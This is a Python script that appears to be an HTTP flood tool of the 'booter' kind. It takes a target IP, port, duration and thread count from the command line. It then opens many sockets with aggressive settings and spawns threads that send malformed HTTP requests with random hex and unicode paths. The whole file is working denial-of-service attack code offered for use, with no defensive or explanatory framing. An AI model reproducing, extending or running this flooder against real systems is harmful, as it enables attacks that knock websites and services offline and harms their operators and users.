import socket,random,threading,sys,string,struct
from MODEL.data import read

hex_list = [f'\\x{i:02x}' for i in range(256)]

def generate_unicode(length):
    return '\\u' + ''.join(random.choice('abcdef' + string.digits) for _ in range(length * 4))

def generate_hex(length):
    return ''.join(random.choice(hex_list) for _ in range(length))

def random_end():
   random_char = [random.choice(('\n','\r')) for _ in range(4)]
   return "".join(random_char)

def flooder(s,booters,p):
   try:
      for _ in range(booters):
        if read() == True:break
        s.sendall(p[0].encode()); s.send(p[0].encode())
        s.sendall(p[1].encode()); s.send(p[1].encode())
        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
   except:pass

def HTTP_QUERY(ip,port,time,booters,methods):
    path_size = 1
    for _ in range(time):
        if read() == True:break
        try:
         s = socket.socket(socket.AF_INET,socket.SOCK_STREAM, socket.IPPROTO_TCP)
         s.setblocking(1); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 5); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 300); s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255); s.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 63); s.setsockopt(socket.SOL_SOCKET, socket.SO_OOBINLINE, 1)
         s.connect((ip, port));s.connect_ex((ip ,port))
         s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
         
         paths = [generate_hex(path_size), generate_unicode(path_size)]
         end = random_end()
         for path in paths:
          if read() == True:break
          packet = [f'{methods} /{path} HTTP/1.1\nHost: {ip}{end}',f'{methods} /{path} HTTP/1.1\nHost: {ip}:{port}{end}']
          threading.Thread(target=flooder,args=(s,booters,packet)).start()
        except:pass
        path_size += 1

ip,methods = sys.argv[1],sys.argv[6]
port,time,booters,th = int(sys.argv[2]),int(sys.argv[3]),int(sys.argv[4]),int(sys.argv[5])
# IP PORT TIME BOOTER THREAD METHODS
for _ in range(th):
   if read() == True:break
   threading.Thread(target=HTTP_QUERY,args=(ip,port,time,booters,methods)).start()
